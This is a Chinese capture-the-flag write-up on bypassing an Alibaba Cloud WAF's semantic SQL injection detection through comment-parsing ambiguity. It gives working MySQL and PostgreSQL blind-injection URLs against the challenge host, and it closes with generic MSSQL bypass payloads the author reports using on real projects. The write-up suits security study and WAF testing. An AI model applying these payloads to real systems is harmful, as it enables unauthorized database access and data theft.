# 阿某云-WAF挑战赛wp

> 原文: https://www.ctfiot.com/62086.html
> ID: 62086

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG小刚

本次SQL注入绕过主要是对抗的语义分析，我个人对语义的认识就是让waf认为这个语句是无法执行的，但实际上我们可以获得我们想要数据的。

想实现这样的效果，要么通过报错注入构造错误语句；要么使用三种注释方法，去测试waf对注释是否可以正确解析。

我这次所有的绕过原理也主要是waf对/**/的识别出现歧义。然后配合其他简单的绕过正则手法组合在一起实现绕过。

MYSQL

POC

type=mysql&id=’=”/*”=FIELD(if(substr((/*/*/SelEct+table_name+from{a+%0dinformation_schema%23%0a.%0atables}+where+table_schema=’test’+limit+0,1),1,1)=’b’,1,3),1,3)%23

1、首先测试发现mysql是不能堆叠注入的。

然后我个人是比较喜欢使用报错盲注、布尔盲注获取数据的。按照mysql手册找了个不常用到的FIELD()函数，然后配合if语句构造布尔盲注

FIELD(if(1=1,1,3)1,3)

当if(1=1)时返回1，在FIELD()函数里与1匹配，所以返回1有查询结果

返回0时则无查询结果，然后在if语句里构造select语句即可。

2、select+from语句使用下面构造绕过对information_schema.columns的检测

select a from {a+%0dinformation_schema%23%0a.%0acolumns}

3、然后真正的语义绕过，是使用/**/注释构造语句

下面POC，/*使用双引号包裹起来后不会起到注释作用

而这一部分是一个正常注释，当作空格使用

而语义WAF会将/*到最近的*/的解析为注释，所以这里面内容

"=feld(if(substr((/*/

就被注释了，此时被认定为错误的语句，即可绕过。

获取数据

获取数据库名：

通过报错获取数据库名test

获取表名：

http://sqli.aliyundemo.com/query?type=mysql&id=’=”/*”=FIELD(if(substr((/*/*/SelEct+table_name+from{a+%0dinformation_schema%23%0a.%0atables}+where+table_schema=’test’+limit+0,1),1,1)=’b’,1,3),1,3)%23

获取字段名

http://sqli.aliyundemo.com/query?type=mysql&id=’=”/*”=FIELD(if(substr((/*/*/SelEct+column_name+from{a+%0dinformation_schema%23%0a.%0acolumns}+where+table_schema=’test’+and+table_name=’boy’+limit+4,1),1,1)=’b’,1,3),1,3)%23

获取数据库数据

http://sqli.aliyundemo.com/query?type=mysql&id=’=”/*”=FIELD(if(substr((/*/*/SelEct+flag+from{a+flag_a4f69eb5719562771ece9729f6a58983}+limit+0,1),1,1)=’2′,1,3),1,3)%23

POSTGRESQL

POC

http://sqli.aliyundemo.com/query?type=psql&id=/*’or+’0′!=position(substr((/*a*/SELECT+flag+from+flag_9740453557b698bee491c3fd9f2f3c69),2,1)+in+’0′)+–+

1、首先查询手册使用了position()函数，配合substr函数构造布尔盲注

'0'!=position(substr('abc',1,1) in 'a')

position()会返回字符串在后面字符串中出现的次数，大于0则条件成立，则可以查询到数据

等于0则不成立，查询不到数据

然后使用相同的注释方式，使用/**/构造语句，让WAF认为此处被注释

&id=/*'or+'0'!=position(substr((/*a*/select

/*'or+'0'!=position(substr((/*a*/被注释

实则被单引号包裹起来，并不能起到注释作用

这里测试了一下，如果删除最前面/*则会拦截的

获取flag值

http://sqli.aliyundemo.com/query?type=psql&id=/*’or+’0′!=position(substr((/*a*/select+flag+from+flag_9740453557b698bee491c3fd9f2f3c69),1,1)+in+’0′)+–+

小结

自从发现这个思路后，在项目上也遇到了几个类似语义的waf，绕起来也比较顺风顺水

123'AND 1=len('/*')/(seleCT -- */name from master..sysdatabases for xml path) --

22329-len('/*')/@@version

2-len('/*')/(case when substring(db_name(),1,1)='x' then 0 else 1 end)

当然挑战赛也是在榜，其他大佬们的思路就等官网发布文章了。


```
FIELD(if(1=1,1,3)1,3)
select a from {a+%0dinformation_schema%23%0a.%0acolumns}
"=feld(if(substr((/*/
'0'!=position(substr('abc',1,1) in 'a')
&id=/*'or+'0'!=position(substr((/*a*/select
/*'or+'0'!=position(substr((/*a*/被注释
123'AND 1=len('/*')/(seleCT -- */name from master..sysdatabases for xml path) --
22329-len('/*')/@@version
2-len('/*')/(case when substring(db_name(),1,1)='x' then 0 else 1 end)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1665535083.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1665535083.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/1-1665535084.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1665535085.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/9-1665535087.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/4-1665535088.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1665535089.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/7-1665535090.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1665535091.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/7-1665535092.png)